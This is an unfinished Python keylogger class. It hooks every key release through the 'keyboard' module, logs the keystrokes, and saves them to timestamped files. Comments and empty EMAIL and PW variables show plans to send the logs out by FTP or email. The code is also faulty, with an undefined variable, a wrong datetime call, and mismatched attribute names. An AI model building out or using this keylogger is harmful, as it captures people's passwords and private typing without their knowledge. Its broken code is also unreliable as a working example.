# Create a class which does keylogging for us
# uses the keyboard module, which detects when a key is released
# this data can then be copied to a file or uploaded...etc

import keyboard
import datetime

# global variables
INTERVAL = 60
EMAIL = ""
PW = ""


class keylogger:

    # Currently supports local logs, plans to support ftp and email
    def __init__(self, update_interval, report_method = "local"):

        self.update_interval = update_interval
        self.report_method = report_method

        # variable to contain all the keystrokes in this interval
        self.log = ""

        # we use start and end times as filenames
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    # https://github.com/boppreh/keyboard#keyboard.on_release_key
    # https://github.com/boppreh/keyboard#keyboard.hook
    def callback(self, event):
        # callback is called when a key is released
        # event is defined as an attribute "name"

        key = event.name

        if len(name) > 1:
            # is a special character i.e (alt, ctrl, etc)
            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # append key to global log
        self.log += name

    # local file functions for saving keylogs locally
    def assign_filename(self):
         # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"sample_logs/{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")